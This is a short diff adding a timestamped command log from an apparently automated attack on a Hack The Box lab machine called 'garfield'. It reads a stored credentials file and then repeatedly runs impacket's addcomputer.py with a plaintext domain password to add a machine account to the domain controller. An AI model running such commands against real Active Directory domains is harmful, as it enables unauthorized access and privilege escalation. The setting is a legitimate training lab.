@@ -1,0 +1,6 @@
+[19:06:04] READ: /htb/machines/garfield/state/creds.jsonl
+[19:06:07] RUN: impacket-addcomputer -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
+[19:06:10] RUN: which addcomputer.py 2>/dev/null || find / -name "addcomputer.py" -type f 2>/dev/null | head -3
+[19:06:20] RUN: addcomputer.py -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
+[19:06:23] RUN: /home/hacker/.local/bin/addcomputer.py -computer-name 'NEWPC' -computer-pass 'NewComputerPass123!' 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.17.178 2>&1
+[19:06:46] RUN: ip addr show tun0 2>&1; ping -c 1 -W 3 10.129.17.178 2>&1
